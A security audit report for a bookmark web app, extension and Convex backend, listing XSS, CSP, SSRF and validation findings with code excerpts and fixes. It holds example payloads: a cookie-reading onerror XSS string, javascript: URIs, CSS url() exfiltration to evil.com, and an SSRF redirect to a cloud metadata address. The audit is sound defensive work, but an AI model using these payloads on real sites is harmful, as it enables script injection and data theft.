# Security Audit

Comprehensive security audit of the Brute Bookmarks web application, browser extension, and Convex backend.
Conducted 2026-02-19.

---

## Executive Summary

The codebase has **made significant progress** since the earlier Codex audit (2026-02-12). The main XSS vector in `categories.ts` has been mitigated with a proper `escapeHtml()` utility, `window.open` calls now include `noopener,noreferrer`, the Convex backend validates URL schemes, and the `postMessage` auth bridge uses `window.location.origin` instead of wildcard `*`. SSRF protection with private IP blocklists has been added to both `metadata.ts` and `favicons.ts`. A Content Security Policy has been added to `index.html`.

However, **residual risks remain**: two `innerHTML` injection points still lack escaping (bookmark-modal category select, icon-picker emoji search), the CSP allows `unsafe-inline` styles which weakens its XSS mitigation, the `iconPath` field accepts arbitrary strings including `javascript:` URIs that bypass the URL validator (which only checks `bookmark.url`), all `JSON.parse` calls on localStorage data lack schema validation, and the import pipeline's JSON parser does not validate URL schemes. These are not theoretical — a user importing a crafted JSON file, or an attacker who can write to localStorage (via XSS or shared machine), can achieve script execution.

### Risk Overview

- **Critical:** 1
- **High:** 3
- **Medium:** 5
- **Low:** 3

---

## Findings by Severity

### CRITICAL

#### C1. Unescaped `innerHTML` in `populateCategorySelect` — stored XSS via category name

**File:** `src/components/modals/bookmark-modal.ts`, lines 15-21

```typescript
function populateCategorySelect(selectedCategoryId: string): void {
  const select = document.getElementById('bookmark-category-select') as HTMLSelectElement;
  const categories = getCategories();
  select.innerHTML = categories
    .map((cat) => `<option value="${cat.id}" ${cat.id === selectedCategoryId ? 'selected' : ''}>${cat.name}</option>`)
    .join('');
}
```

**Problems:**
- `cat.name` is interpolated directly into HTML without `escapeHtml()`. A category named `</option><img src=x onerror=alert(document.cookie)>` would execute JavaScript.
- `cat.id` is also unescaped in the `value` attribute. In Convex mode, IDs are system-generated and safe, but in local mode, IDs are `'c' + Date.now()` — not directly exploitable, but inconsistent with the escaping discipline elsewhere.
- This function runs every time the bookmark modal opens (both add and edit flows), making it a reliable trigger.
- The CSP `script-src` directive does not include `unsafe-inline`, so inline `onerror` handlers would be blocked in production **if the CSP is correctly applied**. But the CSP is delivered via `<meta>` tag, which is weaker than an HTTP header (it can be bypassed if an attacker can inject before the `<meta>` tag is parsed). Also, CSP does not protect against attribute injection that breaks out of the `<option>` context to inject, for example, a `<form>` with an `action` pointing to an attacker-controlled server.
- Attack vector: import a crafted JSON file containing a category with an XSS payload in the `name` field (see M2 — JSON import lacks URL/field sanitization), then open the bookmark add/edit modal.

**Recommendation:** Import and use `escapeHtml()` for both `cat.name` and `cat.id`:
```typescript
import { escapeHtml } from '../../utils/escape-html';

select.innerHTML = categories
  .map((cat) => `<option value="${escapeHtml(cat.id)}" ${cat.id === selectedCategoryId ? 'selected' : ''}>${escapeHtml(cat.name)}</option>`)
  .join('');
```

---

### HIGH

#### H1. `iconPath` accepts arbitrary strings — `javascript:` and `data:text/html` URIs in `<img src>`

**Files:**
- `convex/bookmarks.ts`, lines 33, 58 — `iconPath: v.optional(v.string())` with no validation
- `convex/bookmarks.ts`, line 40 — `validateUrl(url)` is called for `url` but NOT for `iconPath`
- `src/components/categories.ts`, line 123 — `src="${escapeHtml(getIconUrl(bookmark))}"`
- `src/utils/icons.ts`, lines 3-6 — `getIconUrl` returns `bookmark.iconPath` directly

```typescript
// convex/bookmarks.ts — create mutation (lines 28-63)
args: {
  categoryId: v.id('categories'),
  title: v.string(),
  url: v.string(),
  iconPath: v.optional(v.string()),  // <-- NO validation
},
handler: async (ctx, { categoryId, title, url, iconPath }) => {
  // ...
  validateUrl(url);  // only validates `url`, NOT `iconPath`
  // ...
  return await ctx.db.insert('bookmarks', {
    // ...
    iconPath: iconPath ?? undefined,  // stored as-is
  });
},
```

```typescript
// src/utils/icons.ts (lines 3-6)
export function getIconUrl(bookmark: Bookmark): string {
  if (bookmark.iconPath) {
    return bookmark.iconPath;  // returned as-is
  }
  // ...
}
```

**Problems:**
- An attacker (or malicious import file) can set `iconPath` to `javascript:alert(1)` or `data:text/html,<script>alert(1)</script>`. While modern browsers block `javascript:` in `<img src>`, `data:text/html` URIs in `<img>` tags do not execute scripts. However, this is a defense-in-depth failure — the application should not store arbitrary URI schemes.
- The `escapeHtml()` call on line 123 prevents attribute breakout, which is good. But if `iconPath` is ever used outside of an `<img src>` context (e.g., in a future feature, or in the icon preview at `bookmark-modal.ts` line 115 where it's assigned directly: `(document.getElementById('preview-icon') as HTMLImageElement).src = bookmark.iconPath`), the lack of scheme validation becomes exploitable.
- `data:` URIs with large payloads can be used for DoS (multi-megabyte data URIs stored per bookmark).
- The `importBulk` mutation (line 150-206) also accepts `iconPath` without validation, allowing bulk injection of malicious icon paths.

**Recommendation:** Add `iconPath` validation in the Convex backend:
```typescript
function validateIconPath(iconPath: string): void {
  if (iconPath.startsWith('data:image/')) return; // data URIs, image only
  try {
    const parsed = new URL(iconPath);
    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
      throw new Error('Invalid icon URL scheme');
    }
  } catch (e) {
    if (e instanceof Error && e.message === 'Invalid icon URL scheme') throw e;
    throw new Error('Invalid icon URL format');
  }
}
```

#### H2. CSP weakened by `unsafe-inline` styles and overly broad `img-src`

**File:** `index.html`, lines 6-15

```html
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' https://cdn.jsdelivr.net https://*.clerk.accounts.dev https://clerk.brutebookmarks.com;
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    img-src 'self' data: blob: https: http:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://*.convex.cloud wss://*.convex.cloud https://*.clerk.accounts.dev https://*.clerk.com https://clerk.brutebookmarks.com https://cdn.jsdelivr.net https://www.google.com https://upload.wikimedia.org https://commons.wikimedia.org;
    worker-src 'self' blob:;
    frame-src https://*.clerk.accounts.dev https://*.clerk.com https://clerk.brutebookmarks.com;
">
```

**Problems:**
- `style-src 'unsafe-inline'` allows injected `<style>` tags and inline `style` attributes. An attacker who achieves attribute injection (even without script execution) can use CSS-based data exfiltration (e.g., `background: url('https://evil.com/?token=...')` to leak data visible in the DOM).
- `img-src 'self' data: blob: https: http:` allows loading images from **any origin** over HTTP or HTTPS, plus `data:` and `blob:` URIs. This means a crafted `iconPath` like `https://evil.com/tracking-pixel.gif?userId=...` will load successfully, enabling user tracking.
- CSP is delivered via `<meta>` tag, not HTTP header. `<meta>` CSP cannot use `report-uri` or `report-to` directives, so policy violations are invisible. If the hosting platform (Vercel) can serve CSP headers, that is strictly better.
- No `base-uri` directive — an attacker who can inject `<base href="https://evil.com/">` can redirect all relative URLs.
- No `form-action` directive — attribute injection in the category select (C1) could inject a `<form action="https://evil.com">` that submits data on click.

**Recommendation:**
1. Move CSP to Vercel response headers (via `vercel.json`) to enable `report-to`.
2. Add `base-uri 'self'` and `form-action 'self'`.
3. Restrict `img-src` to specific trusted domains: `'self' data: blob: https://www.google.com https://upload.wikimedia.org https://cdn.jsdelivr.net https://icon.horse https://icons.duckduckgo.com`.
4. Work toward removing `unsafe-inline` from `style-src` by moving Clerk's inline styles to a nonce-based approach or by accepting the Clerk styles via a hash.

#### H3. Import pipeline accepts arbitrary data without URL scheme or field-length validation

**Files:**
- `src/utils/bookmark-parsers.ts`, lines 137-157 — `parseJSON`
- `src/components/modals/settings-modal.ts`, lines 107-140 — `importFromFile`
- `src/data/store.ts`, lines 833-850 — `importBulk`
- `convex/bookmarks.ts`, lines 150-206 — server-side `importBulk`

```typescript
// src/utils/bookmark-parsers.ts — parseJSON (lines 137-157)
export function parseJSON(content: string): Category[] {
  const data = JSON.parse(content);

  if (!Array.isArray(data)) {
    throw new Error('Expected an array of categories');
  }

  // Validate structure
  for (const cat of data) {
    if (typeof cat.name !== 'string' || !Array.isArray(cat.bookmarks)) {
      throw new Error('Invalid category structure');
    }
    for (const b of cat.bookmarks) {
      if (typeof b.title !== 'string' || typeof b.url !== 'string') {
        throw new Error('Invalid bookmark structure');
      }
    }
  }

  return data as Category[];
}
```

**Problems:**
- `parseJSON` checks for structural shape (`name` is string, `bookmarks` is array, `title` and `url` are strings) but does NOT validate:
  - URL schemes — `javascript:alert(1)` passes validation
  - `iconPath` values — any string is accepted
  - Field lengths — a category name of 1 million characters passes
  - Number of bookmarks per category — no limit
- In **local mode** (no Convex), imported data bypasses the server-side `validateUrl` entirely. The data flows directly from `parseJSON` to `setCategories` to `localStorage` to rendering via `innerHTML` in `categories.ts`.
- In **sync mode**, the server-side `importBulk` does call `validateUrl` on bookmark URLs (line 180-184), which would catch `javascript:` URLs. But `iconPath` is not validated (see H1), and category `name` fields are not length-limited.
- The `parseNetscapeHTML` parser (lines 23-131) does filter some dangerous schemes (`javascript:`, `chrome:`, `about:`, etc.) via `isSkippableUrl` on line 30-32, which is good. But the JSON parser has no equivalent.
- Combined with C1 (unescaped category names in the select), a crafted JSON import file is the easiest attack path to XSS.

**Recommendation:**
1. Add URL scheme validation to `parseJSON` — reject or strip `javascript:`, `data:` (except `data:image/`), `vbscript:`, and other dangerous schemes.
2. Add field-length limits (e.g., `name` max 200 chars, `title` max 500 chars, `url` max 2048 chars).
3. Add `iconPath` validation (same scheme allowlist as H1).
4. Add a per-category bookmark count limit in the client-side parser to match the server-side limit.

---

### MEDIUM

#### M1. `localStorage` JSON.parse without schema validation — data corruption leads to crashes or injection

**Files:**
- `src/data/store.ts`, line 103 — `_categories = JSON.parse(savedData);`
- `src/data/store.ts`, line 109 — `_localTabGroups = JSON.parse(savedGroups);`
- `src/data/store.ts`, line 262 — `const legacy: Category[] = JSON.parse(savedData);`
- `src/data/store.ts`, line 403 — `const parsed = JSON.parse(savedData);`
- `src/data/local-storage.ts`, line 19 — `return JSON.parse(raw) as T;`

```typescript
// src/data/store.ts — initializeData (lines 100-114)
export async function initializeData(): Promise<void> {
  const savedData = localStorage.getItem('speedDialData');
  if (savedData) {
    _categories = JSON.parse(savedData);  // No validation
  } else {
    _categories = [];
  }
  const savedGroups = localStorage.getItem('speedDialTabGroups');
  if (savedGroups) {
    _localTabGroups = JSON.parse(savedGroups);  // No validation
  } else {
    _localTabGroups = [];
  }
  rebuildLocalLayout();
}
```

**Problems:**
- `JSON.parse` can return any type. A malformed `speedDialData` value (e.g., `"hello"` or `{"not":"an array"}`) would set `_categories` to a non-array, causing `.length`, `.map`, `.find` to throw at render time.
- On a shared machine (library, school, internet cafe), another user or a malicious extension could write crafted data to `localStorage` for the Brute Bookmarks origin. This data would be loaded and rendered without validation, enabling stored XSS via the unescaped paths (C1, M3).
- `local-storage.ts` line 19 casts `JSON.parse(raw) as T` with no runtime check — any call site that expects a specific type could receive anything.
- A `try/catch` wrapper is present in `local-storage.ts:getItem` but NOT in `store.ts:initializeData`. If `JSON.parse` throws (malformed JSON), the app crashes on startup.

**Recommendation:**
1. Wrap all `JSON.parse` calls in `try/catch` with fallback to default values.
2. Add a runtime shape validator (e.g., check `Array.isArray` and verify each element has `id`, `name`, `bookmarks` properties of correct types) before assigning to `_categories`.
3. Consider using a schema validation library (e.g., Zod, which is already a Convex peer dependency) for consistent validation.

#### M2. SSRF in `favicons.ts` — redirect-based bypass of private IP blocklist

**File:** `convex/favicons.ts`, lines 39-56, 164-255

```typescript
// convex/favicons.ts — fetchWithTimeout (lines 39-56)
async function fetchWithTimeout(
  url: string,
  options: RequestInit = {},
): Promise<Response> {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), FETCH_TIMEOUT);
  try {
    const resp = await fetch(url, {
      ...options,
      signal: controller.signal,
      headers: { "User-Agent": USER_AGENT, ...options.headers },
      redirect: "follow",  // <-- follows redirects
    });
    return resp;
  } finally {
    clearTimeout(timeout);
  }
}
```

```typescript
// convex/favicons.ts — resolveForDomain (line 164)
async function resolveForDomain(domain: string): Promise<FaviconResult> {
  const baseUrl = `https://${domain}`;
  // Tier 1: apple-touch-icon.png
  const ati = `${baseUrl}/apple-touch-icon.png`;
  if (await isValidIcon(ati)) { ... }
  // ...
  // Tier 3: Fetch HTML
  const resp = await fetchWithTimeout(baseUrl, { ... });
  // ...
}
```

**Problems:**
- `isPrivateHost` checks the hostname BEFORE the fetch, but `redirect: "follow"` means the initial request to `https://evil.com/apple-touch-icon.png` could redirect to `http://169.254.169.254/latest/meta-data/`. The redirect is followed automatically, and the private IP check is never re-applied to the redirect target.
- Same issue exists in `metadata.ts` (line 82): `redirect: "follow"` without post-redirect hostname validation.
- `resolveForDomain` constructs URLs from user-provided domain names. While the domain is extracted from a URL via `extractDomain`, there's no check that the domain doesn't contain encoded characters that could bypass the hostname check.
- The function performs up to 8+ HTTP requests per domain resolution (apple-touch-icon, apple-touch-icon-precomposed, HTML page, manifest, individual icon links, icon.horse, duckduckgo). With `resolveFaviconBulk` accepting unbounded bookmark arrays, this is a server-side resource amplification risk.

**Recommendation:**
1. Use `redirect: "manual"` and manually validate each redirect target's hostname against the private IP blocklist before following.
2. Add a maximum redirect count (e.g., 5).
3. Add a per-request limit to `resolveFaviconBulk` (e.g., max 100 bookmarks per call).
4. Consider using DNS resolution to check the target IP before connecting, if the Convex runtime supports it.

#### M3. Unescaped emoji data attributes in icon-picker

**File:** `src/components/icon-picker.ts`, lines 258-269

```typescript
resultsEl.innerHTML = matches
  .map(
    (entry, index) => {
      const svgUrl = `${TWEMOJI_BASE}${entry.codepoint}.svg`;
      return `
    <div class="icon-result" data-emoji-index="${index}" data-emoji-codepoint="${entry.codepoint}" data-emoji-keyword="${entry.keywords[0]}">
      <img src="${svgUrl}" alt="${entry.emoji}">
    </div>
  `;
    },
  )
  .join('');
```

**Problems:**
- `entry.codepoint`, `entry.keywords[0]`, and `entry.emoji` are interpolated into HTML attributes and content without `escapeHtml()`.
- The emoji data comes from `src/data/emoji-data.ts`, which is a static build-time file generated from `unicode-emoji-json` + `emojilib`. If this data file is trusted (committed to the repo, never modified at runtime), the risk is LOW in practice.
- However, if the emoji data generation script were compromised, or if the data source were changed to a runtime fetch, these unescaped interpolations would become XSS vectors.
- `entry.emoji` is used as an `alt` attribute value without escaping — a double-quote in the emoji data could break the attribute boundary.
- Compare with the Wikimedia search results on lines 192-200, which DO use `escapeHtml()` for `icon.thumbUrl` and `icon.title`.

**Recommendation:** Apply `escapeHtml()` consistently to all interpolated values, even for trusted data, as defense-in-depth:
```typescript
data-emoji-codepoint="${escapeHtml(entry.codepoint)}"
data-emoji-keyword="${escapeHtml(entry.keywords[0])}"
alt="${escapeHtml(entry.emoji)}"
```

#### M4. `theme-init.js` reads `localStorage` and sets CSS properties without sanitization

**File:** `public/theme-init.js`, lines 1-12

```javascript
(function() {
  var theme = localStorage.getItem('theme') || 'dark';
  document.documentElement.setAttribute('data-theme', theme);

  var accent = localStorage.getItem('accentColor_' + theme);
  if (accent) document.documentElement.style.setProperty('--accent', accent);

  var pw = localStorage.getItem('pageWidth');
  if (pw) document.documentElement.style.setProperty('--page-width', (800 + (pw / 100) * 800) + 'px');
})();
```

**Problems:**
- `theme` is read from localStorage and used directly as an attribute value on `<html>`. A value like `dark" onmouseover="alert(1)` would NOT work because `setAttribute` is safe (it does not parse the value as HTML). However, the value is also used to construct the key `accentColor_` + theme — if `theme` contains special characters, this is benign but messy.
- `accent` is read from localStorage and set as a CSS custom property value. A malicious value like `red; background: url('https://evil.com/leak')` would be set as the `--accent` property. Whether this executes depends on where `--accent` is used in CSS — if it's used in a `background` shorthand, the injected URL could fire.
- `pw` (pageWidth) is read and used in arithmetic. If `pw` is not a number, `(pw / 100) * 800` evaluates to `NaN`, and `--page-width` would be set to `NaNpx`, which CSS ignores — functionally a no-op.
- This script runs synchronously before the CSP `<meta>` tag is fully parsed (it's loaded via `<script src>` before the CSP tag in the document order). **Wait — actually, the CSP meta tag is in `<head>` before the script tag, so CSP should be active.** However, `theme-init.js` is loaded as a non-module script from `'self'`, which is allowed by the `script-src` directive.

**Recommendation:**
1. Validate `theme` against an allowlist: `if (theme !== 'dark' && theme !== 'light') theme = 'dark';`
2. Validate `accent` as a CSS color value (regex for hex colors: `/^#[0-9a-fA-F]{3,8}$/`).
3. Validate `pw` as a number within expected range before using it.

#### M5. No length or content validation on `name` and `title` fields in Convex mutations

**Files:**
- `convex/categories.ts`, line 17 — `args: { name: v.string() }` (create)
- `convex/categories.ts`, line 39 — `args: { id: v.id('categories'), name: v.string() }` (update)
- `convex/bookmarks.ts`, lines 30-31 — `title: v.string(), url: v.string()` (create)
- `convex/bookmarks.ts`, line 69 — `title: v.string()` (update)
- `convex/schema.ts` — all `v.string()` fields have no length constraint

```typescript
// convex/categories.ts — create (lines 16-36)
export const create = mutation({
  args: { name: v.string(), groupId: v.optional(v.id('tabGroups')) },
  handler: async (ctx, { name, groupId }) => {
    // ...
    // No length check on `name`
    return await ctx.db.insert('categories', {
      name,
      order: maxOrder + 1,
      userId,
      groupId,
    });
  },
});
```

**Problems:**
- A user (or malicious API client) can create a category with a 10MB `name` string, or a bookmark with a 10MB `title`. This data is stored in Convex, synced to all connected clients via subscription, rendered into the DOM, and cached in localStorage.
- Combined with `escapeHtml()`, large strings won't cause XSS, but they will cause:
  - Client-side memory exhaustion (DOM rendering of millions of characters)
  - localStorage quota exhaustion (5MB limit on most browsers)
  - Convex bandwidth costs (subscription pushes all data to all connected sessions)
- The `importBulk` mutation has a 500-category and 5000-bookmark limit, but no per-field length limit.

**Recommendation:** Add string length validation to all Convex mutations:
```typescript
if (name.length > 200) throw new Error('Category name too long');
if (title.length > 500) throw new Error('Bookmark title too long');
if (url.length > 2048) throw new Error('URL too long');
if (iconPath && iconPath.length > 10000) throw new Error('Icon path too long');
```

---

### LOW

#### L1. Extension content script match pattern includes `localhost`

**File:** `extension/src/entrypoints/content.ts`, line 11

```typescript
export default defineContentScript({
  matches: ['*://*.brutebookmarks.com/*', 'http://localhost:5173/*'],
  // ...
});
```

**Problems:**
- In the published extension, the `localhost` match pattern means the content script runs on any page served at `http://localhost:5173`. On a developer machine, this is fine. But if a non-developer installs the extension and happens to run any other app on port 5173, the content script will inject into that app and listen for `postMessage` events.
- The content script sends `BB_EXT_INSTALLED` to the page, revealing the extension's presence to any page on that port. This is a minor information leak.
- The `ALLOWED_ORIGINS` check on line 19 mitigates the auth token relay risk — only messages from the expected origins are processed.

**Recommendation:** Remove `http://localhost:5173/*` from the match pattern in production builds. Use a build-time flag or WXT environment variable to conditionally include it only in development.

#### L2. Clipboard auto-read on bookmark modal open

**File:** `src/components/modals/bookmark-modal.ts`, lines 85-96

```typescript
if (getAutofillUrl()) {
  try {
    const text = await navigator.clipboard.readText();
    if (text && /^https?:\/\/.+/i.test(text.trim())) {
      const urlInput = document.getElementById('bookmark-url') as HTMLInputElement;
      urlInput.value = text.trim();
      urlInput.dispatchEvent(new Event('change'));
    }
  } catch {
    // Clipboard access denied or unavailable — silently ignore
  }
}
```

**Problems:**
- When the "autofill URL" preference is enabled, the app reads the clipboard every time the "Add Bookmark" modal opens. The regex filter (`/^https?:\/\/.+/i`) ensures only HTTP(S) URLs are used, which is good.
- On browsers that show a clipboard permission prompt (Firefox), this creates UX friction. On Chromium (which grants clipboard access silently to the focused page), this is seamless but could surprise users who don't realize their clipboard is being read.
- If a user has sensitive data on the clipboard (e.g., a password copied from a password manager) that happens to start with `https://`, it would be auto-filled into the URL field. This is a privacy concern rather than a security vulnerability.
- The feature is opt-in (controlled by `getAutofillUrl()` preference), which mitigates the concern.

**Recommendation:** This is acceptable as-is given the opt-in nature. Consider adding a visible indicator when clipboard auto-fill is active (e.g., a small "Pasted from clipboard" label near the URL field).

#### L3. `data:` URI icon paths stored and rendered without size limits

**Files:**
- `src/components/icon-picker.ts`, lines 297-312 — `uploadCustomIcon`
- `src/components/icon-picker.ts`, lines 314-346 — `resizeImageToDataUri`

```typescript
// src/components/icon-picker.ts — resizeImageToDataUri (lines 314-346)
function resizeImageToDataUri(file: File, size: number): Promise<string> {
  return new Promise((resolve, reject) => {
    const img = new Image();
    // ...
    img.onload = () => {
      // ...
      canvas.width = size;  // 128
      canvas.height = size; // 128
      // ...
      resolve(canvas.toDataURL('image/png'));
    };
    // ...
  });
}
```

**Problems:**
- The resize function constrains images to 128x128 pixels, which limits the resulting `data:` URI to roughly 5-50KB depending on image complexity. This is reasonable.
- However, there is no file size check on the input `File` object before processing. A very large image (e.g., 100MB) would be loaded into memory for processing. The browser's `Image` element handles this, but it could cause memory pressure.
- The resulting `data:` URI is stored in `iconPath` (both localStorage and Convex). With many bookmarks using custom icons, this could consume significant storage.
- No file type validation beyond `file.type.startsWith('image/')` on the drop handler (line 375). SVG files starting with `image/svg+xml` would be processed — while the canvas rendering step effectively sanitizes SVG (it rasterizes), the intermediate `objectUrl` creation is safe.

**Recommendation:** Add a file size check before processing (e.g., max 5MB input) and consider compressing the output to JPEG for photographic images to reduce storage.

---

## Attack Surface Map

```
                        TRUST BOUNDARY: Browser ←→ Convex Cloud
                        ═══════════════════════════════════════

  ┌─────────────────────────────────────────────────────────────────────┐
  │                         BROWSER (Client)                           │
  │                                                                    │
  │  ┌──────────────┐     ┌───────────────────┐     ┌──────────────┐  │
  │  │ localStorage │────→│   store.ts         │────→│ categories.ts│  │
  │  │              │     │ JSON.parse (M1)    │     │ innerHTML    │  │
  │  │ speedDialData│     │ No schema check    │     │ + escapeHtml │  │
  │  │ accentColor  │     └────────┬───────────┘     │ (MOSTLY OK)  │  │
  │  │ theme        │              │                  └──────┬───────┘  │
  │  └──────┬───────┘              │                         │         │
  │         │                      │                  ┌──────▼───────┐  │
  │  ┌──────▼───────┐              │                  │bookmark-modal│  │
  │  │theme-init.js │              │                  │ innerHTML    │  │
  │  │CSS injection │              │                  │ NO escapeHtml│  │
  │  │   (M4)       │              │                  │   *** C1 *** │  │
  │  └──────────────┘              │                  └──────────────┘  │
  │                                │                                    │
  │  ┌───────────────┐      ┌──────▼───────────┐     ┌──────────────┐  │
  │  │ File Import   │─────→│ bookmark-parsers │────→│ settings     │  │
  │  │ .json / .html │      │ parseJSON: no URL│     │ -modal.ts    │  │
  │  │   (H3)        │      │ scheme validation│     │ importData() │  │
  │  └───────────────┘      └──────────────────┘     └──────────────┘  │
  │                                                                    │
  │  ┌───────────────┐      ┌──────────────────┐                       │
  │  │ Icon Picker   │      │ Extension Bridge │                       │
  │  │ Wikimedia API │      │ postMessage      │                       │
  │  │ escapeHtml OK │      │ origin-checked   │                       │
  │  │ emoji: no     │      │ (OK)             │                       │
  │  │ escape (M3)   │      └──────────────────┘                       │
  │  └───────────────┘                                                 │
  │                                                                    │
  │  ┌───────────────┐      ┌──────────────────┐                       │
  │  │ window.open   │      │ CSP (index.html) │                       │
  │  │ noopener OK   │      │ unsafe-inline    │                       │
  │  │               │      │ broad img-src    │                       │
  │  │               │      │   (H2)           │                       │
  │  └───────────────┘      └──────────────────┘                       │
  └─────────────────────────────────────────────────────────────────────┘
                                    │
                    Clerk JWT (auth) │ ConvexClient (wss://)
                                    │
  ┌─────────────────────────────────▼───────────────────────────────────┐
  │                      CONVEX CLOUD (Server)                         │
  │                                                                    │
  │  ┌───────────────┐      ┌──────────────────┐                       │
  │  │ bookmarks.ts  │      │ categories.ts    │                       │
  │  │ validateUrl   │      │ NO name length   │                       │
  │  │ (url only)    │      │ check (M5)       │                       │
  │  │ NO iconPath   │      └──────────────────┘                       │
  │  │ check (H1)    │                                                 │
  │  │ importBulk:   │      ┌──────────────────┐                       │
  │  │ 500 cat limit │      │ metadata.ts      │                       │
  │  │ 5000 bk limit │      │ fetchPageTitle   │                       │
  │  └───────────────┘      │ SSRF protected   │                       │
  │                          │ but redirect     │                       │
  │  ┌───────────────┐      │ bypass (M2)      │                       │
  │  │ favicons.ts   │      └──────────────────┘                       │
  │  │ SSRF protected│                                                 │
  │  │ but redirect  │      ┌──────────────────┐                       │
  │  │ bypass (M2)   │      │ schema.ts        │                       │
  │  │ no bulk limit │      │ v.string() only  │                       │
  │  │   (M2)        │      │ no length limits │                       │
  │  └───────────────┘      └──────────────────┘                       │
  └─────────────────────────────────────────────────────────────────────┘
```

### Data Flow: Import → XSS

```
Crafted JSON file
    │
    ▼
importFromFile() ──→ parseJSON() ──→ Category[] (no URL/scheme validation)
    │                                      │
    │                          ┌────────────┴────────────┐
    │                          │                         │
    ▼ (local mode)             ▼ (sync mode)             │
setCategories()           importBulk() ──→ Convex        │
    │                     (validates url, NOT iconPath)   │
    ▼                          │                         │
localStorage                   ▼                         │
    │                     Convex subscription             │
    ▼                          │                         │
initializeData()               ▼                         │
JSON.parse (no validation)  rebuild()                     │
    │                          │                         │
    ▼                          ▼                         │
renderCategories() ──→ renderBookmarksGrid()              │
    │                   (escapeHtml on all fields — OK)   │
    │                                                     │
    ▼                                                     │
openAddBookmarkModal() ──→ populateCategorySelect()       │
                            cat.name WITHOUT escapeHtml   │
                                 *** XSS ***              │
```

---

## Positive Security Observations

Since the Codex audit (2026-02-12), the following improvements have been made:

1. **`escapeHtml()` utility created and applied broadly.** `src/utils/escape-html.ts` properly escapes `&`, `<`, `>`, `"`, `'`. It is used consistently in `categories.ts` (28 interpolation points) and `icon-picker.ts` (4 points for Wikimedia results). This is the single biggest security improvement.

2. **`window.open` uses `noopener,noreferrer`.** Both call sites (`bookmark-card.ts:44`, `categories.ts:164`) include the third argument `'noopener,noreferrer'`, eliminating the reverse-tabnabbing risk flagged in the Codex audit.

3. **`postMessage` uses `window.location.origin`.** The auth bridge in `clerk.ts:239` sends tokens with `window.location.origin` as the target origin (not `*`). The extension content script (line 19) validates against an explicit `ALLOWED_ORIGINS` list. The extension bridge (`extension-bridge.ts:48`) also uses `window.location.origin`.

4. **Server-side URL validation.** `convex/bookmarks.ts` has a `validateUrl()` function (lines 4-14) that checks `new URL(url)` and rejects non-HTTP(S) schemes. It is called in `create`, `update`, and `importBulk`.

5. **SSRF protection.** Both `metadata.ts` and `favicons.ts` have private IP blocklists covering RFC1918 ranges, loopback, link-local, and cloud metadata endpoints.

6. **Auth checks on all mutations.** Every Convex mutation checks `ctx.auth.getUserIdentity()` and verifies `userId` ownership before modifying data.

7. **CSP exists.** While imperfect (H2), having a CSP at all is a significant improvement over none. The `script-src` directive blocks inline scripts, which would prevent many XSS payloads from executing even if injection occurs.

8. **Import limits.** `importBulk` enforces 500-category and 5000-bookmark caps, preventing the most obvious DoS vectors.

9. **Netscape HTML parser filters dangerous schemes.** `parseNetscapeHTML` skips `javascript:`, `chrome:`, `about:`, `edge:`, `file:`, and `place:` URLs.

---

## Recommended Overhaul Plan

### Phase 1: Critical fix (< 30 minutes)

1. **Fix C1: Escape category names in bookmark-modal select**
   - Import `escapeHtml` in `bookmark-modal.ts`
   - Apply to `cat.name` and `cat.id` in `populateCategorySelect`
   - Effort: ~5 min, zero risk

2. **Fix M3: Escape emoji data in icon-picker**
   - Apply `escapeHtml` to `entry.codepoint`, `entry.keywords[0]`, and `entry.emoji`
   - Effort: ~5 min, zero risk

### Phase 2: High-priority hardening (1-2 hours)

3. **Add `iconPath` validation to Convex mutations (H1)**
   - Create `validateIconPath()` in `convex/bookmarks.ts`
   - Apply in `create`, `update`, and `importBulk` handlers
   - Allowlist: `https:`, `http:`, `data:image/*` prefix
   - Effort: ~30 min

4. **Harden JSON import parser (H3)**
   - Add URL scheme validation to `parseJSON` (reject `javascript:`, `vbscript:`, etc.)
   - Add field-length limits
   - Add `iconPath` scheme validation
   - Effort: ~30 min

5. **Add string length limits to Convex mutations (M5)**
   - Add length checks to `categories.create`, `categories.update`, `bookmarks.create`, `bookmarks.update`, `bookmarks.importBulk`
   - Effort: ~20 min

### Phase 3: Defense-in-depth (1-2 hours)

6. **Harden CSP (H2)**
   - Move CSP to Vercel response headers (`vercel.json`)
   - Add `base-uri 'self'`, `form-action 'self'`
   - Restrict `img-src` to specific trusted domains
   - Effort: ~30 min (plus testing)

7. **Fix SSRF redirect bypass (M2)**
   - Change `redirect: "follow"` to `redirect: "manual"` in `favicons.ts` and `metadata.ts`
   - Implement manual redirect following with hostname validation
   - Add per-call limit to `resolveFaviconBulk`
   - Effort: ~1 hour

8. **Add localStorage schema validation (M1)**
   - Add `try/catch` around `JSON.parse` in `store.ts:initializeData`
   - Add basic shape validation before assigning to `_categories`
   - Effort: ~30 min

9. **Sanitize `theme-init.js` inputs (M4)**
   - Validate `theme` against `['dark', 'light']` allowlist
   - Validate `accent` as hex color
   - Validate `pw` as number in range
   - Effort: ~10 min

### Phase 4: Cleanup

10. **Remove `localhost` from extension match pattern in production (L1)**
    - Use WXT build config or environment variable
    - Effort: ~15 min

---

## Summary

| Priority | ID | Item | Files Affected | Effort |
|----------|-----|------|----------------|--------|
| Critical | C1 | Unescaped innerHTML in category select | `bookmark-modal.ts` | 5 min |
| High | H1 | No `iconPath` validation in Convex | `convex/bookmarks.ts` | 30 min |
| High | H2 | CSP weaknesses (unsafe-inline, broad img-src) | `index.html`, `vercel.json` | 30 min |
| High | H3 | Import pipeline lacks URL/field validation | `bookmark-parsers.ts` | 30 min |
| Medium | M1 | localStorage JSON.parse without validation | `store.ts`, `local-storage.ts` | 30 min |
| Medium | M2 | SSRF redirect bypass in favicon/metadata | `convex/favicons.ts`, `convex/metadata.ts` | 1 hr |
| Medium | M3 | Unescaped emoji data in icon-picker | `icon-picker.ts` | 5 min |
| Medium | M4 | Unsanitized localStorage in theme-init.js | `public/theme-init.js` | 10 min |
| Medium | M5 | No field-length limits in Convex mutations | `convex/bookmarks.ts`, `convex/categories.ts` | 20 min |
| Low | L1 | Extension localhost match in production | `extension/src/entrypoints/content.ts` | 15 min |
| Low | L2 | Clipboard auto-read on modal open | `bookmark-modal.ts` | Acceptable |
| Low | L3 | No file size check on icon upload | `icon-picker.ts` | 10 min |

**Total estimated effort for Phase 1 (critical):** ~10 minutes.
**Total estimated effort for Phases 1-3 (all actionable items):** ~5-6 hours.

---

## Validation Notes

